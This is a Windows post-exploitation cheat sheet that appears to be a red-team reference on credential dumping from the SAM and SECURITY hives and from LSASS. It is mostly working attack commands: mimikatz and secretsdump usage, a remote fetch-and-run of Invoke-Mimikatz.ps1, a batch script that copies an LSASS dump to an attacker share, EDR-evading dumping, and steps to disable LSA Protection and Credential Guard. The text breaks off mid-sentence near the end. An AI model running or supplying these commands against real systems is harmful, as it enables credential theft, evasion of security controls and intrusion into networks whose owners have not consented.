# Windows - Post exploitation

Post exploitation is the phase of operation once a target host has been
compromised, usually by gaining local `Administrator` / `NT AUTHORITY\SYSTEM`
access.

Post exploitation should generally consist of:
  - retrieving local and domain accounts as well as any sensible information
  stored on the compromised host;
  - implementing a way of persistence on the compromised host;
  - if necessary, disabling of the security solutions deployed on the host to
  use it for further pivoting.

### Credentials dumping

#### Overview

Credential dumping is the process of obtaining account login and password
information, normally in the form of a hash or a clear text password, as well
as any other secrets stored on the compromised host.

On Windows, the users' password and secrets are stored through various
mechanisms and in multiple possible locations:

| Location | Secrets | Description |
|----------|---------|-------------|
| `HKEY_LOCAL_MACHINE\Security Account Manager (SAM)` registry hive. <br/><br/>  File path: `%SystemRoot%/system32/config/SAM` | `LM` / `NTLM` hashes of the host's local accounts. | The `SAM` database contains the local users of the host (as well as the local groups). |
| `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets` registry hive. <br/><br/> File path: `%SystemRoot%/system32/config/SYSTEM` | `MsCacheV1` / `MsCacheV2` hashes of locally cached Active Directory domain accounts. <br/><br/> Others `LSA Secrets`: account cleartext passwords for Windows `services` or `scheduled tasks` that are configured on the host, etc. | The `HKLM\SYSTEM` registry hive contains `cached domain logon information` in order to allow re-logon on the machine even if a Domain Controller is not reachable. <br/> By default, the last 10 accounts used to logon are stored. <br/><br/> The `MsCacheV1` (`Windows Server 2003` / `Windows XP`) and `MsCacheV2` (`Windows Server 2008` / `Windows Vista` and newer) are calculated as follow: <br/><br/> `MsCacheV1 = MD4(hashNTLM . LowerUnicode(<USERNAME>))` <br/><br/> `MsCacheV2 = PBKDF2(HMAC-SHA1, Iterations, MsCacheV1, LowerUnicode(username))` |
| `Local Security Authority Subsystem (LSASS)` process. |  Possible cleartext passwords of domain or local logged-on users. <br/><br/> `LM` / `NTLM` hashes of domain or local logged-on users. <br/><br/> `Kerberos` tickets (`Ticket-Granting Ticket (TGT)` and `service tickets`). <br/><br/> `DPAPI` `MasterKeys` of domain or local logged-on users. <br/><br/> `SmartCard` or `Token` PIN codes. <br/><br/> | Logged-on users credentials are stored by the various `Authentication Package (AP)` / `Security Service Providers (SSP)` that are loaded in the `LSASS` process. <br/><br/> The following `SSP` packages are provided by Microsoft and natively integrated in the Windows operating system: <br/><br/> `MSV1_0 Authentication Package` <br/>-> Primary authentication package that stores `NTLM` / `SHA1` hashes of local or domain account opening for interactive logons, service logons, and network logons. <br/><br/> `Credential Security Support Provider protocol (CredSSP)` / `TSPKG` <br> -> Stores plaintext credentials of non-`Restricted Admin Mode` remote interactive (`RDP`) sessions. <br/><br/> `Digest SSP` (`Wdigest.dll`) <br> -> Legacy `SSP` that stores cleartext credentials. <br/><br/> `Kerberos` <br/> -> Stores `Kerberos SSP/AP` tickets. |
| `DPAPI` credentials: <br/><br/> `Credentials` files, located in `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\<GUID>` <br/><br/> `Windows Credentials` vault stored as a combination of `vpol` and `vsch` files in `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Microsoft\Vault\<GUID>` <br/><br/> Various locations defined by third-party softwares. | Cleartext passwords, web browsers cookies, etc. | `DPAPI` / Generic credentials are defined by programs that leverage the Windows `Data Protection Application Programming Interface (DPAPI)` API to locally store encrypted secrets. |

Additionally, on Domain Controllers, the `NT Directory Services.Directory
Information Tree (NTDS.dit)` Active Directory database contains the `LM` /
`NTLM hashes`, `Kerberos secrets` (`RC4` key, corresponding to the
`NTLM hash` of the account password, and `AES 128/256 bits` keys) and `DPAPI`
keys of all domain accounts. Refer to the `[ActiveDirectory] ntds.dit` note
for techniques and procedures to dump this database.

Refer to the `[General] File transfer` note for methods to transfer the
eventual tools and registry exports / `LSASS` dumps to and from the compromised
hosts.

#### HKLM\SAM, HKLM\SECURITY and HKLM\SYSTEM registry hives

The `SysKey`, also referred to as the `BootKey`, stored in the `HKLM\SYSTEM`
registry hive is necessary to decrypt the `HKLM\SAM` and `HKLM\SECURITY`
registry hives.
The `HKLM\SYSTEM` must thus also be retrieved from the targeted host.

###### Cached domain logon information configuration

The number of cached domain credentials, as `MsCacheV1` or `MsCacheV2` hashes,
in the `HKLM\SECURITY` registry hive is dictated by the `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\CachedLogonsCount`
registry key.

By default, 10 domain accounts logon information can be stored, as the
`CachedLogonsCount` key has a default value of `10`. If the key is set to `0`,
network access to a Domain Controller will be required for the authentication
of domain accounts.    

```
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\"
```

If the aforementioned `CachedLogonsCount` key is not defined but the following
`SecEdit`'s `CachedLogonsCount` registry key is, the number of cached
credentials is restricted through `SecEdit` (using a `Local Security Policy`
`INF` file, a domain `Group Policy`, etc.)

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SecEdit\Reg Values\MACHINE/Software/Microsoft/Windows NT/CurrentVersion/Winlogon/CachedLogonsCount"
```

###### Local Administrator Password Solution (LAPS)

If the Microsoft `Local Administrator Password Solution (LAPS)` solution is
installed on the machine, the password of one (and only one) of the local
account is likely managed through Active Directory and will not be mutualized
with others Windows systems.

The installation of `LAPS` on a system creates the following `DLL` on the
system:

```
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
```

###### Registry hives dump

*Standard technique using the `reg` utility*

The Windows built-in `reg` utility can be used to dump the `HKLM\SAM`,
`HKLM\SECURITY`, and `HKLM\SYSTEM` registry hives:

```
reg save HKLM\SAM <PATH_SAM_FILE>
reg save HKLM\SYSTEM <PATH_SYSTEM_FILE>
reg save HKLM\SECURITY <PATH_SECURITY_FILE>

# One-liner
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SECURITY SECURITY & reg save HKLM\SYSTEM SYSTEM"
```

*Using `shadow copy` volume on hardened systems*

The usage of the `reg.exe` and `regedit.exe` utilities can be restricted
through `Group Policy Object (GPO)` by setting the
`HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools`
registry key to `1`. Trying to use the aforementioned utilities will result in
the following error message: `ERROR: Registry editing has been disabled by your
administrator.`

If such hardening has been implemented on the targeted system, a `shadow copy`
volume can be leveraged to copy the `HKLM\SAM`, `HKLM\SYSTEM`, and
`HKLM\SECURITY` registry hives from disk (as direct copy is not possible due to
the files being locked by continued access).

The `Windows Management Instrumentation (WMI)` class `win32_shadowcopy` can be
used to create a `shadow copy` volume and presents the advantage of being
built-in on both Windows workstations and servers. Alternatively, the Windows
built-in `Volume Shadow Copy Service administrative (vssadmin)` utility may be
used on Windows servers (as the required `vssadmin`'s `create` command is only
available on the Windows Servers operating systems). Refer to the
`[ActiveDirectory] ntds.dit dumping` note for more information on how to
create a `shadow copy` volume using `vssadmin`.

```
# Either commands create the shadow copy volume.
wmic shadowcopy call create Volume='C:\'
powershell.exe -Command (gwmi -List win32_shadowcopy).Create('C:\', 'ClientAccessible')

# Lists the shadow copy volume configured in order to retrieve the created shadow copy ID.
wmic shadowcopy
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_ }

cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SAM <EXPORTED_SAM>"
cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SYSTEM <EXPORTED_SYSTEM>"
cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SECURITY <EXPORTED_SECURITY>"

# Will delete all instances of shadowcopy volumes.
wmic delete

# Deletes the specified shadow copy volume.
Get-WmiObject Win32_ShadowCopy | ForEach-Object { If ($_.ID -like "<GUID>") { $_.Delete() }}

# Alternatively will prompt for confirmation before deleting a shadow copy volume but require to be started through an interactive command prompt.
wmic
wmic:root\cli> shadowcopy delete
```

###### Credentials extraction from the registry hives

The `Impacket`'s `secretsdump.py` Python script can be used to extract the
credentials from the `HKLM\SAM` and `HKLM\SECURITY` hives. `secretsdump.py`
supports the new encryption scheme introduced in the `Windows 10 Anniversary
update`.

```
secretsdump.py -sam <SAM> -system <SYSTEM> [-security <SECURITY>] LOCAL
```

*Deprecated*

The Linux tool `samdump2` can be used to extract the credentials from the `SAM`
hive on a Linux system:

```
samdump2 <SYSTEM_FILE> <SAM_FILE>
```

The `Windows 10 Anniversary update`, introduced, in modern Windows operating
systems, a new encryption scheme, based on `AES`, for the `SAM` database.
`samdump2` has not been updated and will return the
`31d6cfe0d16ae931b73c59d7e0c089c0` hash (blank password or account disabled)
for all local users.

###### Direct local accounts and LSA Secrets extraction through Windows API calls

Alternatively, `mimikatz` may be used directly on the targeted system to
retrieve the local accounts hashes and the `LSA Secrets` through the `Windows
API` (and not by decrypting and parsing the `HKLM\SAM` and `HKLM\SECURITY`
registry hive):

```
# PowerShell in memory injection
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on the attacking machine
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam" "lsadump::cache" "token::revert"';

mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::cache exit
```

###### Remote SAM and LSA Secrets dump and extraction

The `Impacket`'s `secretsdump.py` Python script and the Python `CrackMapExec`
tool, which is built upon `Impacket`, can be used to remotely dump and extract
the `HKLM\SAM` and `HKLM\SECURITY` registry hives.

`secretsdump.py` leverages the Windows `Remote Registry` service to save the
`HKLM\SAM` and `HKLM\SECURITY` registry hives in the target host
`%SYSTEMROOT%\Temp` directory. The exported hives are then remotely parsed to
extract the credentials.

`CrackMapExec` wraps around `secretsdump.py` and can be used for distributed
dumping of the local accounts and `LSA Secrets` of multiple hosts.

```
# Impacket's secretsdump.py
# NTLM authentication
secretsdump.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP>
secretsdump.py -hashes <LM_HASH:NT_HASH> [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
secretsdump.py -k -no-pass [-dc-ip <DC_IP>] <HOSTNAME>

# CrackMapExec
# <TARGET | TARGETS> : IP(s), IP range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of <TARGETS>
# Local accounts - HKLM\SAM
crackmapexec smb <TARGET | TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
# LSA Secrets - `HKLM\SECURITY
crackmapexec smb <TARGET | TARGETS> --lsa (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

###### SAM and LSA Secrets dump and extraction through C2 agents

*Metasploit / meterpreter*

The `meterpreter` module `hashdump` can be used to dump the `SAM` database on a
compromised host:

```
meterpreter> hashdump
```

The `Metasploit` module `post/windows/gather/lsa_secrets` can be used to dump
the `LSA Secrets` trough a privileged `meterpreter` session:

```
msf> use post/windows/gather/lsa_secrets
```

*Cobalt Strike*

The `Cobalt Strike` `beacon` built-in function `[beacon] -> Access -> Dump
Hashes` (or `hashdump` from the beacon interact console) will dump the `SAM`
database of the compromised host.

The function output will be automatically parsed and the harvested credentials
added to the `Cobalt Strike` credentials database: `View -> Credentials`.

#### LSASS

##### LSASS possible protections

The protection mechanisms described below only affect the `LSASS` process and
do not impact the local accounts, stored in the `HKLM\SAM` registry hive, nor
the `LSA Secrets`, stored in the `HKL\SECURITY` registry hive.

###### Local Security Authority Protection

*Concept*

The `Local Security Authority (LSA) Protection` mechanism, firstly introduced
in Windows 8.1 and Windows Server 2012 R2, leverage the `Protected Process
Light (PPL)` technology to restrict access to the `LSASS` process. The `PPL`
protection regulates and restricts operations, such as memory injection or
memory dumping of protected processes, even from process holding the
`SeDebugPrivilege` privilege.

The protection level of a process is defined in its `EPROCESS` structure, used
by the Windows kernel to represent processes in memory. The `EPROCESS`
structure includes a `_PS_PROTECTION` field, defining the protection level of a
process through its `Type` (`_PS_PROTECTED_TYPE`) and `Signer`
(`_PS_PROTECTED_SIGNER`) attributes.

```
Type (_PS_PROTECTED_TYPE)
First 3 bits contain the type of protected process (refers to the low nibble of the value):

PsProtectedTypeNone = 0
PsProtectedTypeProtectedLight = 1
PsProtectedTypeProtected = 2
PsProtectedTypeMax = 3

Signer (_PS_PROTECTED_SIGNER)
The top 4 bits contain the protected process signer (refers to the high nibble of the value):

# < Windows 10 1607 Redstone 1 (Anniversary Update) x86
PsProtectedSignerNone = 0
PsProtectedSignerAuthenticode = 1
PsProtectedSignerCodeGen = 2
PsProtectedSignerAntimalware = 3
PsProtectedSignerLsa = 4
PsProtectedSignerWindows = 5
PsProtectedSignerWinTcb = 6
PsProtectedSignerMax = 7

# > Windows 10 1607 Redstone 1 (Anniversary Update) x86
[...]
PsProtectedSignerWinSystem = 7
PsProtectedSignerApp = 8
PsProtectedSignerMax = 9
```

For example, `0x31` refers to an Antimalware `PPL` process while `0x52` refers
to a Windows signed protected process.

Whenever an initiator process attempts to conduct an operation on a target
process, a restriction will be applied:
  - if the initiator process' `Type` is (strictly) lower than the target
    process' `Type` (example: `PsProtectedTypeNone` <
    `PsProtectedTypeProtectedLight`).
  - or if the initiator process does not "dominate" the target process, which
    is the case if the target process's `Signer` attribute belongs to the
    initiator process' `DominateMask`. Each `Signer` type is associated with a
    different `DominateMask` mask in the Windows `RtlProtectedAccess` table.

In such cases, the operations allowed on the target process depends on its
`Signer` attribute. With the exception of the `PsProtectedSignerNone`
processes, for which no restriction are defined, the authorized operations are
limited to:

```
PROCESS_QUERY_LIMITED_INFORMATION
PROCESS_SUSPEND_RESUME
PROCESS_SET_LIMITED_INFORMATION
PROCESS_TERMINATE # (except for PsProtectedSignerLsa, PsProtectedSignerWinTcb and PsProtectedSignerAntimalware).
```

If the `LSA Protection` mechanism is activated on the system, the `LSASS`
process runs under the `PsProtectedSignerLsa-Light` protection level.
The `PROCESS_VM_READ` right, required to read `LSASS`'s data, is only granted
to others protected processes (`Type` >= 1) that "dominate" the
`PsProtectedSignerLsa` `Signer`.

The `LSA Protection` is activated through the `HKEY_LOCAL_MACHINE`'s `RunAsPPL`
registry key:

```
# RunAsPPL = 0x0 or undefined -> The LSASS process is not protected (PsProtectedTypeNone).
# RunAsPPL = 0x1 -> The LSASS process is protected (PsProtectedSignerLsa-Light).

reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /v RunAsPPL
```

For Windows systems that support the `Unified Extensible Firmware Interface
(UEFI) Secure Boot` technology, an `UEFI` variable is additionally set in the
firmware when `LSA protection` is enabled. This variable can not be altered
through a modification of the `RunAsPPL` registry key and guarantee the
persistence of the `LSA protection`.

```
# UEFISecureBootEnabled = 0x0 or undefined -> The UEFI Secure Boot mechanism is disabled.
# RunAsPPL = 0x1 -> The UEFI Secure Boot mechanism is enabled.

reg query HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SecureBoot\State /v UEFISecureBootEnabled
```

*Operational*

If `UEFISecureBootEnabled` is disabled, and the targeted system can be safely
rebooted, the `RunAsPPL` registry key can be simply set to `0x0` to disable the
`LSA Protection` mechanism:

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SecureBoot\State /v UEFISecureBootEnabled /d 0x0
```

If `UEFISecureBootEnabled` is enabled, a driver can be loaded in the Windows
kernel to execute code in the kernel space which allows for the modification of
every processes' `EPROCESS` structure (that contain the `_PS_PROTECTION`
field). The `SeLoadDriverPrivilege` is required in order to load a kernel
driver.

In order for a driver to be loaded, the driver file must be digitally signed
either:
  - for signature date prior to 29/07/2015, with a trusted cross-signed
    certificate, du to compatibility reasons for older drivers.
  - with a trusted `Extended Validation Code Signing Certificate`
    certificate and `Windows Hardware Quality Labs (WHQL)` certified.

If there no antivirus solution installed on the targeted system, or if the
solution deployed can be disabled, `mimikatz`'s `mimidrv` driver, digitally
signed in 2013, can be used to disable the `LSA Protection` mechanism. The
driver can be loaded as a kernel driver through `mimikatz`, which will result
in the creation of the driver `mimidrv` service (service type:
`SERVICE_KERNEL_DRIVER`). The loaded driver may then be used to protect the
`mimikatz` process, with a protection `Type` set to `PsProtectedTypeMax` and a
`Signer` level of `PsProtectedSignerWinTcb`, in order to "dominate" the
`lsass` process and be able to dump its memory.

Note that the driver file `mimidrv.sys` must be present in the same directory
as the `mimikatz.exe` being executed.

```
# One-liner: mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processProtect /process:mimikatz.exe" "sekurlsa::logonpasswords" "exit"

# If necessary.
mimikatz # token::elevate
mimikatz # privilege::debug

# Loads the mimidrv driver and protect the mimikatz process.
mimikatz # !+
mimikatz # !processProtect /process:mimikatz.exe

# Futher mimikatz commands.
mimikatz # sekurlsa::logonpasswords
[...]

# Stop the driver and removes the mimidrv service
mimikatz # !-
```

If a protected antivirus solution is installed on the targeted system, a
legitimate driver vulnerable to a code execution vulnerability can be loaded in
order to gain kernel space code execution. The `gdrv-loader` project leverages
the `gdrv.sys` driver, vulnerable to multiples critical vulnerabilities
(`CORE-2018-0007`), to load the specified unsigned driver. Doing so, a modified
`mimidrv` driver that does not raise antivirus alerts can be loaded in memory.  

```
# Loads the (potentially unsigned) specified driver using the gdrv.sys driver.
gdrv-loader.exe gdrv.sys <mimidrv.sys | DRIVER_FILE_PATH>

# The mimikatz process can directly be protected as the mimidrv driver is loaded in the kernel.
mimikatz # !processProtect /process:mimikatz.exe
[...]

# Unloads the specified driver.
gdrv-loader.exe <mimidrv.sys | DRIVER_FILE_PATH>
```

Alternatively, the Microsoft official `LSA Protection` opt-out procedure can be
followed in order to disable the `LSA Protection` mechanism and reset the
`UEFI` variable.

```
Procedure source: https://www.microsoft.com/en-us/download/details.aspx?id=40897

reg add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SecureBoot\State /v UEFISecureBootEnabled /d 0x0

# Requires the x64\LsaPplConfig.efi or x86\LsaPplConfig.efi Extensible Firmware Interface files from the official procedure.
# Should be run in a command prompt with elevated privileges.
mountvol X: /s
copy C:\LsaPplConfig.efi X:\EFI\Microsoft\Boot\LSAPPLConfig.efi /Y
bcdedit /create {0cb3b571-2f2e-4343-a879-d86a476d7215} /d "DebugTool" /application osloader
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} path "\EFI\Microsoft\Boot\LSAPPLConfig.efi"
bcdedit /set {bootmgr} bootsequence {0cb3b571-2f2e-4343-a879-d86a476d7215}
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions %1
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} device partition=X:
mountvol X: /d
```

###### Microsoft Credentials Guard

Microsoft `Credential Guard` is a virtualization-based isolation technology,
introduced in Microsoft's `Windows 10 (Enterprise edition)` which prevents
direct access to the credentials stored in the `LSASS` process.

When `Credentials Guard` is activated, an `LSAIso` (*LSA Isolated*) process is
created in `Virtual Secure Mode`, a feature that leverages the virtualization
extensions of the CPU to provide added security of data in memory. Access to
the `LSAIso` process are restricted even for an access with the
`NT AUTHORITY\SYSTEM` security context. When processing a hash, the `LSA`
process perform a `RPC` call to the `LSAIso` process, and waits for the
`LSAIso` result to continue. Thus, the `LSASS` process won't contain any
secrets and in place will store `LSA Isolated Data`.

Microsoft `Credential Guard` requires a number of hardware and software
requirements:
  - Support for Virtualization-based security
  - `UEFI` Secure boot
  - Supported 64-bit Windows operating systems: `Windows 10 Enterprise`,
    `Windows Server 2016`, and `Windows Server 2019`
  - `Trusted Platform Module (TPM)` recommended but not required

*Enumeration of Microsoft Credentials Guard configuration*

The PowerShell `Get-CimInstance` can be used to check if `Credential Guard` is
running:

```
# Credential Guard is running if SecurityServicesConfigured contains 1
Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
```

*Disabling of Microsoft Credentials Guard*

If `Credential Guard` was enabled with `UEFI Lock`, the settings are persisted
in `EFI` (firmware) variables and disabling Credential Guard will require
a "physical presence at the machine to press a function key to accept the
change" after reboot . Note that if `Credential Guard` was not enabled with
`UEFI Lock` it can be disabled through a network session and will require a
reboot of the machine.

Disabling `Credential Guard` will not allow for the retrieval of the
secrets currently stored in the `LSASS` process but will enable the retrieval
of further credentials stored after reboot.

```
# 0 Disables Credential Guard.
# 1 Enables Credential Guard.
# 2 Enables Credential Guard without making it persist to the UEFI.
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags"

# Disabling Credential Guard
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Device Guard" /v EnableVirtualizationBasedSecurity /d 0 /f /t REG_DWORD
```

*Bypass of Microsoft Credentials Guard using memory patching*

Patches the `LSASS` process directly to enable the `Wdigest` `SSP`. Further
authentications will result in cleartext credentials to be stored in the
`LSASS` process while Microsoft Credentials Guard will still be running.

https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240
https://blog.xpnsec.com/exploring-mimikatz-part-1/

##### LSASS dumping and credentials extraction

###### Methodology and recommended tools

While `mimikatz` can be used by itself to dump and extract the credentials
from the `LSASS` process, `mimikatz` released binaries are universally flagged
by antivirus solutions. It is thus recommended to use others techniques and
tools to dump the `LSASS` process of the remote host and to use `mimikatz` only
to extract credentials from the exfiltrated dump of target.  

Note that `LSASS` process dump from Windows operating systems of the `Windows
NT 5` family (`Windows Server 2003` / `Windows XP`) can only be parsed on
Windows operating systems of the same family (i.e `Windows NT 5`) and of the
same architecture (32 bits `x86` or 64 bits `x64`).

| Use case | Recommended tool(s) |
|----------|---------------------|
| Remote code execution after exploiting a critical vulnerability, etc. | Windows built-in `comsvcs.dll` |
| Knowledge of a local administrator password / `NTLM` hash. <br/> *Limited to domain accounts or the local built-in Administrator account (`RID 500`).* | `CrackMapExec`'s `lsassy` module <br/><br/> `lsassy` |
| Interactive or remote interactive logon session. | Windows built-in `Task Manager` <br/><br/> Windows built-in `comsvcs.dll` |
| Distributed credentials extraction of multiple hosts. <br/> *Limited to domain accounts or the local built-in Administrator account (`RID 500`).* | `lsassy` <br/><br/> `CrackMapExec`'s `lsassy` module |
| Against an host protected by an `Endpoint Detection and Response (EDR)` solution that implements Windows `API` hooks. | `EDR` specific. <br/><br/> Worth a try: <br/> `Dumpert` <br/> Windows built-in `Task Manager` <br/> Windows built-in `comsvcs.dll` |

###### Windows built-in Task Manager

Since `Windows Vista`, the built-in Windows `Task Manager` `GUI` utility can be
used to easily dump the `LSASS` process in interactive logon session. To open
the task manager while in a `Remote Desktop Protocol (RDP)` session type
`taskmgr` in a command prompt or press the `Ctrl + Shift + Esc` keys.

The procedure to dump the `LSASS` process using the task manager is as follow:

```
More Details -> Details -> Right click "lsass.exe" -> Create Dump File
```

###### Dumpert

`Dumpert` is a tool, written in `C`, that uses direct Windows `System Calls`
(`ZwProtectVirtualMemory` and `ZwWriteVirtualMemoryto`) to unhook Windows
`APIs` in order to dump the `LSASS` process with out being detected by
`Anti-Virus` or `Endpoint Detection and Response (EDR)` that rely on Windows
user-land `API` hooks.

`Dumpert` can be used either as a standalone executable or as a `DLL`, that can
be executed using the Windows built-in `rundll32` utility:

```
Dumpert.exe

rundll32.exe Dumpert-DLL.dll,Dump
```

A `Shellcode Reflective DLL Injection (sRDI)` version of the code is also
provided, coupled with a `Cobalt Strike` `agressor` script that uses the
`Cobalt Strike`'s beacon `shinject` command to inject the `sRDI` shellcode
into the current process. Through this execution method, `Dumpert` is executed
without the executable file being written to the compromised system disk.

The `sRDI` shellcode is a conversion of the `Dumpert` `DLL` made using the
`sRDI` project's `ConvertToShellcode.py` Python script:

```
python3 ConvertToShellcode.py Outflank-Dumpert.dll
```

After importing the `Outflank-Dumpert.cna` `agressor` script in `Cobalt Strike`
(`Cobalt Strike` -> `Script Manager` -> Load), the `dumpert` command can be
used through a `Cobalt Strike` beacon. The command will inject the shellcode
into the beacon process, dump `LSASS` into `C:\Windows\Temp\dumpert.dmp` using
`Dumpert` (`DLL` version), and finally download the dump file on the C2 server.

```
beacon> dumpert
beacon> rm C:\Windows\Temp\dumpert.dmp
```

###### Windows built-in comsvcs.dll

The Windows built-in DLL `comsvcs.dll` exposes the `MiniDump` function that can
be leveraged to dump the `LSASS` process. The `rundll32` Windows built-in
utility can be used to load the `comsvcs.dll` `DLL` and run the `MiniDump`
function.

Note that the process conducting the dump must have debug privileges (i.e the
`SeDebugPrivilege` privilege enabled), which is by default the case of
`PowerShell` process run from an elevated context.

```
tasklist /FI "imagename eq lsass.exe"
Get-Process lsass | Ft Id

rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> "<PATH_LSASS_DUMP>" full
powershell -c rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> "<PATH_LSASS_DUMP>" full
```

The following `bat` script automates the process and exfiltrate the `lsass`
dump to a remote share:

```
For /F "Tokens=2" %%I in ('tasklist /FI "imagename eq lsass.exe"') Do Set LsassPid=%%I

powershell.exe -c rundll32 C:\windows\system32\comsvcs.dll MiniDump %LsassPid% "C:\Windows\System32\spool\drivers\color\lsass.dmp" full

IF EXIST "C:\Windows\System32\spool\drivers\color\lsass.dmp" (
	dir \\<LHOST>\TMP
	xcopy /Y /i /q "C:\Windows\System32\spool\drivers\color\lsass.dmp" "\\<LHOST>\TMP"
  del "C:\Windows\System32\spool\drivers\color\lsass.dmp"
)
```

###### Sysinternals' ProcDump

`ProcDump` is a command-line utility tool signed by Microsoft and part of the
`sysinternals` tools suite.

It can be used to dump the `LSASS` process with out raising antivirus alerts on
all Windows operating systems.

```
procdump.exe -accepteula -ma lsass.exe <PATH_LSASS_FILE>
rm <PATH_LSASS_FILE>

# Trough a meterpreter session
upload <PATH/procdump.exe> C:
execute -f "C:\procdump.exe" -a '-accepteula -ma lsass.exe <PATH_LSASS_DUMP>'
download <PATH_LSASS_DUMP>
rm <PATH_LSASS_DUMP>
```

###### Mimikatz

`Mimikatz` can be used to extract the credentials (cleartext passwords, `LM` /
`NTLM` hashes, `Kerberos` tickets from, etc.) from `LSASS`.

The commands below may be used as a one-liner in the form of
`mimikatz.exe "<COMMAND1>" "<COMMAND2>" "exit"`.

`mimikatz` can be instructed to load the specified `LSASS` dump file and to
execute the specified commands to extract credentials from the loaded `LSASS`
dump in place of the current host `LSASS` process:

```
mimikatz # sekurlsa::minidump <LSASS_FILE>
```

```
# Logs further mimikatz output to the specified file.
mimikatz # log <LOG_FILE>

# If necessary, elevates privileges to "NT AUTHORITY\SYSTEM".
mimikatz # token::elevate

# If necessary, acquires and enables the "SeDebugPrivilege" privilege.
mimikatz # privilege::debug

# Retrieves credentials (cleartext passwords and NTLM hashes) from the msv, tspkg, wdigest, kerberos, ssp and credman providers.
mimikatz # sekurlsa::logonpasswords

# Retrieves the Kerberos tickets, both TGTs and service tickets, from all active sessions.
mimikatz # sekurlsa::tickets

# Dumps credentials on Domain Controllers.
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::lsa /inject /user:<krbtgt | USERNAME>
```

Additionally, the `Invoke-Mimikatz.ps1` `PowerShell` script can be injected
into memory to use `mimikatz` on the targeted host with out uploading a
`mimikatz` binary on disk. However, as of 2020, this approach is flagged by
most `Anti-Virus` solutions.  

```
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on a attacking machine.
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds;
```

###### lsassy

The Python utility and library `lsassy` can be used to remotely dump the
`LSASS` processes, and extract credentials, on one or multiple hosts in a
distributed manner. `Lsassy` tries to dump the `LSASS` process of the specified
hosts, and if successful, parses the `LSASS` dumps directly on the remote
hosts.

`lsassy` implements three techniques, explicated above, to dump the `LSASS`
process: using the Windows built-in `comsvcs.dll` DLL executed using
`rundll32.exe`, by uploading and executing `sysinternals`' `procdump.exe`,
and ultimately by uploading and executing `dumpert.exe`.

The `pypykatz` Python script, which is an implementation of some
functionalities of `Mimikatz` in pure Python, is used to extract the
credentials from the `LSASS` dump.

```
# As a standalone CLI utility
# TARGETS = IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets
lsassy [-d <DOMAIN>>] -u <USERNAME> -p <PASSWORD> --format pretty <TARGETS>
lsassy [-d <DOMAIN>] -u <USERNAME> -H <NTLMHASH> --format pretty <TARGETS>

# As a Python library
from lsassy.core import Lsassy

lsassy = Lsassy(hostname="<HOSTNAME | IP>", username="<USERNAME>", domain="<DOMAIN>", password="<PASSWORD>")
credentials = lsassy.get_credentials()
for credential in credentials:
    [...]
```

Additionally, `lsassy` can be used as a `CrackMapExec` module (installation and
usage detailed below).

###### CrackMapExec

The Python `CrackMapExec` tool offers two modules to dump and extract
credentials from the `LSASS` process of remote host(s):

  - `mimikatz`, which uses the `Invoke-Mimikatz.ps1` `PowerShell` script.
    `CrackMapExec` will temporally host the script using a Python web server
    and instruct the remote host(s) to download and inject in memory the script
    in order to execute `Invoke-Mimikatz -DumpCreds` with out creating a file
